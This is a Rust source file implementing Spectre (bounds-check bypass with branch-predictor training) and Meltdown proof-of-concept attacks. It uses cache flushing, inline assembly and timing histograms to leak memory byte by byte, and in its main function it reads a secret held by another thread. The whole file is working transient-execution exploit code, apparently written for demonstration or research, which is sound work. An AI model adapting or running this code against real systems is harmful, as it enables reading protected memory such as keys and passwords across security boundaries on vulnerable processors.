#![feature(asm)]

use std::num::Wrapping;

#[cfg(feature = "handle-sigsegv")]
use nix::sys::signal::{sigaction, SaFlags, SigAction, SigHandler, SigSet, Signal};

mod util;
use crate::util::*;

pub const MULTIPLE_OFFSET: usize = 8192;
pub const CACHE_LINE_SIZE: usize = 4096;
pub const NB_CYCLES_TRAIN: u64 = 1000;
pub const NB_TIMES: usize = 1000;
pub const ZERO_TRESHOLD: usize = 998;

pub static mut TEST_ARR: [u8; 256 * MULTIPLE_OFFSET + CACHE_LINE_SIZE + 2 * 4096] =
    [0; 256 * MULTIPLE_OFFSET + CACHE_LINE_SIZE + 2 * 4096];
pub static mut LATENCIES: [u64; 256] = [0; 256];

pub static mut BASE_ADDR: usize = 0;
pub static mut MIN_NB_CYCLES: u64 = 0;
pub static mut SPECTRE_LIMIT: u64 = 64;
pub static mut SECRET: &[u8; 64] =
    b"0000000000000000000000000000000000000000000000000000000000000000";

trait Method {
    const NB_CYCLES_OFFSET: u64;

    unsafe fn perform(
        preload_op: unsafe fn(),
        target_address: *const u8,
        nb_bytes: usize,
    ) -> Vec<u8>;
}

struct Meltdown;

impl Method for Meltdown {
    const NB_CYCLES_OFFSET: u64 = 0;

    unsafe fn perform(
        preload_op: unsafe fn(),
        target_address: *const u8,
        nb_bytes: usize,
    ) -> Vec<u8> {
        #[cfg(feature = "handle-sigsegv")]
        sigaction(
            Signal::SIGSEGV,
            &SigAction::new(
                SigHandler::SigAction(handle_sigsegv),
                SaFlags::empty(),
                SigSet::empty(),
            ),
        )
        .unwrap();

        let mut res: Vec<u8> = Vec::with_capacity(nb_bytes);

        for i in 0..nb_bytes {
            let mut histogram = [0usize; 256];

            for _ in 0..NB_TIMES {
                // load the data that must be accessed in cache
                preload_op();

                flush_measurement_area();

                repeat_move_for_training_meltdown();

                access_memory(target_address as usize + i);

                let leaked_byte = measure_byte::<Self>().unwrap_or(0);
                histogram[leaked_byte as usize] += 1;
            }

            if histogram[0] > ZERO_TRESHOLD {
                //println!("{:?}", histogram);
                res.push(0);
            } else {
                res.push(
                    histogram[1..]
                        .iter()
                        .enumerate()
                        .max_by(|(_, x), (_, y)| x.cmp(y))
                        .map(|(x, _)| x as u8 + 1)
                        .unwrap(),
                )
            }
        }

        res
    }
}

struct Spectre;

impl Method for Spectre {
    const NB_CYCLES_OFFSET: u64 = 15;

    unsafe fn perform(
        preload_op: unsafe fn(),
        target_address: *const u8,
        nb_bytes: usize,
    ) -> Vec<u8> {
        let target = (Wrapping(target_address as usize) - Wrapping(SECRET as *const _ as usize)).0;
        let limit = SPECTRE_LIMIT as usize;

        let mut res = Vec::new();
        for i in 0..nb_bytes {
            let mut found = false;
            for _ in 0..500 {
                // training phase
                for i in 0..500_000 {
                    spectre_test(i % limit);
                }

                // attack phase
                flush_measurement_area();
                std::arch::x86_64::_mm_prefetch(
                    SECRET as *const _ as *const i8,
                    std::arch::x86_64::_MM_HINT_T0,
                );
                std::arch::x86_64::_mm_prefetch(
                    &BASE_ADDR as *const usize as *const i8,
                    std::arch::x86_64::_MM_HINT_T0,
                );
                std::arch::x86_64::_mm_clflush(&SPECTRE_LIMIT as *const u64 as *const u8);

                preload_op();
                asm!("mfence", "lfence");

                spectre_test(target + i);

                let measured_byte = measure_byte::<Self>().unwrap_or(0);
                if measured_byte != 0 {
                    res.push(measured_byte);
                    found = true;
                    break;
                }
            }
            if !found {
                res.push(0);
            }
        }

        res
    }
}

#[inline(always)]
unsafe fn spectre_test(off: usize) {
    let secret_base = SECRET as *const _ as usize;
    let base_addr = BASE_ADDR;
    // we can only read the first SPECTRE_LIMIT bytes, so we're safe, right?
    // Right!?
    asm!(
        // if off <= SPECTRE_LIMIT {
        "mov rcx, [rcx]", "cmp rcx, {2}", "jb 2f",
        // read_volatile(BASE_ADDR[SECRET[off]*MULTIPLE_OFFSET])
            // rbx = SECRET[off]
            "movzx rbx, byte ptr [rax+{0}]",
            // rbx = SECRET[off]*MULTIPLE_OFFSET
            "imul rbx, {multiple_offset}",
            // rax = *(BASE_ADDR+SECRET[off]*MULTIPLE_OFFSET)
            "movzx rax, byte ptr [{1}+rbx]",
        // end of loop
        "2:",
        in(reg) secret_base, in(reg) base_addr, in(reg) off, multiple_offset = const MULTIPLE_OFFSET, inout("rax") off => _, inout("rcx") &SPECTRE_LIMIT => _, out("rbx") _);
}

fn read_ptr<M: Method>(preload_op: unsafe fn(), target_adress: usize) -> usize {
    let vec = unsafe { M::perform(preload_op, target_adress as *const u8, 8) };
    vec.iter()
        .enumerate()
        .fold(0, |acc, (pos, e)| acc | ((*e as usize) << (pos * 8)))
}

fn main() {
    setup_measurements();

    let (tx, rx) = std::sync::mpsc::channel();

    std::thread::spawn(move || {
        let secret: usize = 0x1ff23ff45ff67ff8;
        tx.send(&secret as *const _ as usize).unwrap();
        loop {}
    });

    let secret_addr = rx.recv().unwrap();

    println!(
        "With Spectre: 0x{:x}",
        read_ptr::<Spectre>(|| {}, secret_addr)
    );

    println!(
        "With Meltdown: 0x{:x}",
        read_ptr::<Meltdown>(|| {}, secret_addr)
    );
}
